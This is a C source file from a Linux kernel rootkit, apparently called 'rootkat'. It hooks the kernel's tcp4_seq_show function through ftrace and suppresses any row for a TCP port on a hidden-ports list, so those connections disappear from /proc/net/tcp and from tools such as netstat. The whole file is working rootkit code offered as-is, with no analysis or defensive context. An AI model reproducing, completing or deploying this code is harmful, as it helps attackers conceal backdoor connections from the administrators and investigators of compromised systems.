// SPDX-License-Identifier: MIT
#include <linux/kernel.h>
#include <linux/seq_file.h>
#include <net/sock.h>
#include "ftrace_hook.h"
#include "hidden_ports.h"
#include "hook_tcp4_seq_show.h"

#define TAG "rootkat/hook_tcp4_seq_show: "

static const char * const tcp4_seq_show_candidates[] = {
	"tcp4_seq_show", NULL,
};

typedef int (*tcp4_seq_show_t)(struct seq_file *seq, void *v);

static int rootkat_tcp4_seq_show(struct seq_file *seq, void *v);

static struct rootkat_hook hook_tcp4_seq_show = {
	.candidates  = tcp4_seq_show_candidates,
	.replacement = rootkat_tcp4_seq_show,
};

/*
 * `v` is either SEQ_START_TOKEN (header row) or a `struct sock *` for
 * a row corresponding to a TCP connection. `sk_num` is the local port
 * in host byte order, sitting in struct sock_common — accessing it is
 * safe regardless of TCP_SEQ_STATE_LISTENING vs ESTABLISHED.
 */
static int rootkat_tcp4_seq_show(struct seq_file *seq, void *v)
{
	tcp4_seq_show_t orig = (tcp4_seq_show_t)hook_tcp4_seq_show.original;

	if (v != SEQ_START_TOKEN) {
		struct sock *sk = (struct sock *)v;

		if (rootkat_is_port_hidden(sk->sk_num))
			return 0;
	}

	return orig(seq, v);
}

int rootkat_hook_tcp4_seq_show_install(void)
{
	return rootkat_hook_install(&hook_tcp4_seq_show);
}

void rootkat_hook_tcp4_seq_show_remove(void)
{
	rootkat_hook_remove(&hook_tcp4_seq_show);
}
